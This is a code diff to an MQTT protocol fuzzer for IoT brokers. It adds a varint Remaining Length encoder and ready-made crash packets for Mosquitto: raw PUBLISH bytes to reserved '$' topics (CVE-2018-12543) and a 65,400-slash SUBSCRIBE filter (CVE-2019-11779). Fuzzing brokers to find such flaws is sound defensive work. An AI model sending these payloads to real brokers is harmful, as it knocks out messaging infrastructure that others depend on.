@@ -67,6 +67,52 @@ import logging
 logger = logging.getLogger(__name__)
 
 
+class MQTTRemainingLength(Size):
+    """Size primitive that renders the MQTT Remaining Length as a variable-length
+    integer (1-4 bytes, 7 bits per byte with a continuation bit), per MQTT 3.1.1
+    §2.2.3 / MQTT 5.0 §1.5.5.
+
+    A fixed-width ``Size`` cannot encode this field: ``length=1`` is correct only
+    for payloads < 128 bytes, and ``length=2`` corrupts small payloads (the high
+    byte 0x00 decodes as Remaining Length 0). So once a fuzzed field pushed the
+    payload >= 128 bytes the broker desynced before deeper parsing -- a coverage
+    gap. The DEFAULT (non-fuzzed) rendering now emits a correct varint; fuzzing
+    the length field itself still yields the inner bit-field mutations, so the
+    deliberately-malformed-length coverage is unchanged.
+    """
+
+    @staticmethod
+    def _encode_varint(n: int) -> bytes:
+        # MQTT Remaining Length is at most 4 bytes (max 268,435,455). Clamp
+        # defensively so a pathological computed length can't loop unbounded.
+        if n < 0:
+            n = 0
+        n = min(n, 268435455)
+        out = bytearray()
+        while True:
+            byte = n % 128
+            n //= 128
+            if n > 0:
+                byte |= 0x80
+            out.append(byte)
+            if n == 0 or len(out) >= 4:
+                break
+        return bytes(out)
+
+    def encode(self, value, mutation_context):
+        if value is None:  # default (not fuzzing this field): real MQTT varint
+            if self._recursion_flag:
+                return self._get_dummy_value()
+            return self._encode_varint(self._calculated_length(mutation_context=mutation_context))
+        # Fuzzing the length field itself: keep the inner bit-field mutations
+        # (the malformed-length coverage the tests rely on).
+        return self.bit_field.encode(value=value, mutation_context=mutation_context)
+
+    def _get_dummy_value(self):
+        # One-byte placeholder used only to break the size-of-self recursion.
+        return b"\x00"
+
+
 class MQTTFuzzer(StatefulFuzzer):
     """MQTT Protocol Fuzzer for IoT/IIoT messaging protocol testing.
 
@@ -303,6 +349,13 @@ class MQTTFuzzer(StatefulFuzzer):
                 "protocol",
                 requires_state=CommonState.PRE_AUTH,
             ),  # Will is in CONNECT
+            RequestInfo(
+                "MQTT_Reserved_Topic",
+                "Reserved '$'-topic PUBLISH (CVE-2018-12543 assert/exit) and "
+                "~65400-'/' SUBSCRIBE filter (CVE-2019-11779 stack overflow)",
+                "boundary",
+                requires_state=CommonState.AUTHENTICATED,
+            ),
             # Phase 5: Standard operations (requires successful CONNECT)
             RequestInfo(
                 "MQTT_Standard_Ops",
@@ -410,7 +463,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "MQTT_Baseline",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="connect_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="connect_payload", length=1
+                ),
                 Block(
                     "connect_payload",
                     children=(
@@ -486,7 +541,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Large_Topic_Overflow",
             children=(
                 Static(name="publish_header", default_value=b"\x30"),
-                Size(name="remaining_length", block_name="publish_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="publish_payload", length=2, endian=">"
+                ),
                 Block(
                     "publish_payload",
                     children=(
@@ -558,6 +615,51 @@ class MQTTFuzzer(StatefulFuzzer):
             ),
         )
 
+        # Reserved '$'-prefixed PUBLISH topic (CVE-2018-12543).
+        # Mosquitto 1.5.0-1.5.2: publishing to a topic that starts with '$' but is
+        # not '$SYS' (e.g. "$test/test") reaches an assert() that is otherwise
+        # unreachable, and the broker exits. These are pre-crafted QoS-0 PUBLISH
+        # packets (fixed header 0x30, topic-length word, topic, empty payload).
+        dollar_topic_publish = Request(
+            "Dollar_Topic_Publish",
+            children=(
+                Group(
+                    "Dollar_Topics",
+                    values=[
+                        b"\x30\x0c\x00\x0a$test/test",  # canonical PoC topic
+                        b"\x30\x06\x00\x04$foo",
+                        b"\x30\x03\x00\x01$",
+                        b"\x30\x08\x00\x06$test/",
+                        b"\x30\x0a\x00\x08$share/x",  # another reserved '$' prefix, not $SYS
+                    ],
+                ),
+            ),
+        )
+
+        # SUBSCRIBE topic filter of ~65400 '/' separators (CVE-2019-11779).
+        # Mosquitto 1.5.0-1.6.5: sub_topic_tokenise recurses once per hierarchy
+        # separator, so a filter of ~65400 '/' chars overflows the stack. The
+        # remaining-length varint and topic-filter-length are rendered correctly
+        # so the packet is well-formed apart from its pathological depth.
+        subscribe_slash_overflow = Request(
+            "Subscribe_Slash_Overflow",
+            children=(
+                Static(name="subscribe_header", default_value=b"\x82"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="slash_payload", length=2, endian=">"
+                ),
+                Block(
+                    "slash_payload",
+                    children=(
+                        DynamicWord("packet_id", lambda: self._next_packet_id(), endian=">"),
+                        Word("topic_filter_length", 65400, endian=">"),
+                        Static(name="slash_topic", default_value=b"/" * 65400),
+                        Byte("qos", 0),
+                    ),
+                ),
+            ),
+        )
+
         # ==================== PHASE 3: CVE-TARGETED OPERATIONS (~3 min) ====================
 
         # CVE-2023-28366: QoS 2 message handling causing memory leak
@@ -566,7 +668,7 @@ class MQTTFuzzer(StatefulFuzzer):
             "QoS2_Memory_Leak",
             children=(
                 Static(name="publish_qos2", default_value=b"\x34"),  # PUBLISH QoS 2
-                Size(name="remaining_length", block_name="qos2_payload", length=1),
+                MQTTRemainingLength(name="remaining_length", block_name="qos2_payload", length=1),
                 Block(
                     "qos2_payload",
                     children=(
@@ -607,7 +709,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Large_User_Properties",
             children=(
                 Static(name="connect_v5", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="v5_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="v5_payload", length=2, endian=">"
+                ),
                 Block(
                     "v5_payload",
                     children=(
@@ -641,7 +745,7 @@ class MQTTFuzzer(StatefulFuzzer):
             "Auth_Bypass",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="auth_payload", length=1),
+                MQTTRemainingLength(name="remaining_length", block_name="auth_payload", length=1),
                 Block(
                     "auth_payload",
                     children=(
@@ -673,7 +777,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Connect_Field_Boundaries",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="connect_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="connect_payload", length=2, endian=">"
+                ),
                 Block(
                     "connect_payload",
                     children=(
@@ -711,7 +817,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Client_ID_Boundaries",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="clientid_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="clientid_payload", length=2, endian=">"
+                ),
                 Block(
                     "clientid_payload",
                     children=(
@@ -741,7 +849,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Topic_Boundaries",
             children=(
                 Static(name="subscribe_header", default_value=b"\x82"),
-                Size(name="remaining_length", block_name="topic_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="topic_payload", length=2, endian=">"
+                ),
                 Block(
                     "topic_payload",
                     children=(
@@ -778,7 +888,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Packet_ID_Boundaries",
             children=(
                 Static(name="subscribe_header", default_value=b"\x82"),
-                Size(name="remaining_length", block_name="packetid_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="packetid_payload", length=1
+                ),
                 Block(
                     "packetid_payload",
                     children=(
@@ -806,7 +918,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "Will_Message_Fuzzing",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="will_payload", length=2, endian=">"),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="will_payload", length=2, endian=">"
+                ),
                 Block(
                     "will_payload",
                     children=(
@@ -857,7 +971,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "mqtt_connect",
             children=(
                 Static(name="connect_header", default_value=b"\x10"),
-                Size(name="remaining_length", block_name="connect_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="connect_payload", length=1
+                ),
                 Block(
                     "connect_payload",
                     children=(
@@ -880,7 +996,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "mqtt_publish",
             children=(
                 Static(name="publish_header", default_value=b"\x30"),
-                Size(name="remaining_length", block_name="publish_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="publish_payload", length=1
+                ),
                 Block(
                     "publish_payload",
                     children=(
@@ -900,7 +1018,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "mqtt_subscribe",
             children=(
                 Static(name="subscribe_header", default_value=b"\x82"),
-                Size(name="remaining_length", block_name="subscribe_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="subscribe_payload", length=1
+                ),
                 Block(
                     "subscribe_payload",
                     children=(
@@ -920,7 +1040,9 @@ class MQTTFuzzer(StatefulFuzzer):
             "mqtt_unsubscribe",
             children=(
                 Static(name="unsubscribe_header", default_value=b"\xa2"),
-                Size(name="remaining_length", block_name="unsubscribe_payload", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="unsubscribe_payload", length=1
+                ),
                 Block(
                     "unsubscribe_payload",
                     children=(
@@ -956,7 +1078,7 @@ class MQTTFuzzer(StatefulFuzzer):
             "mqtt_auth",
             children=(
                 Static(name="auth_header", default_value=b"\xf0"),
-                Size(name="remaining_length", block_name="auth_payload", length=1),
+                MQTTRemainingLength(name="remaining_length", block_name="auth_payload", length=1),
                 Block(
                     "auth_payload",
                     children=(
@@ -987,7 +1109,9 @@ class MQTTFuzzer(StatefulFuzzer):
                 # MQTT remaining length is a varint; the default payload is < 128
                 # bytes so it must be a single octet. A fixed 2-byte Size emits a
                 # leading 0x00 that MQTT reads as remaining-length 0.
-                Size(name="remaining_length", block_name="sparkplug_publish", length=1),
+                MQTTRemainingLength(
+                    name="remaining_length", block_name="sparkplug_publish", length=1
+                ),
                 Block(
                     "sparkplug_publish",
                     children=(
@@ -1172,6 +1296,10 @@ class MQTTFuzzer(StatefulFuzzer):
 
         if self.is_request_enabled("MQTT_Will_Message"):
             self.session.connect(will_message)
+
+        if self.is_request_enabled("MQTT_Reserved_Topic"):
+            self.session.connect(dollar_topic_publish)
+            self.session.connect(subscribe_slash_overflow)
 
         # Phase 5: Standard operations
         if self.is_request_enabled("MQTT_Standard_Ops"):
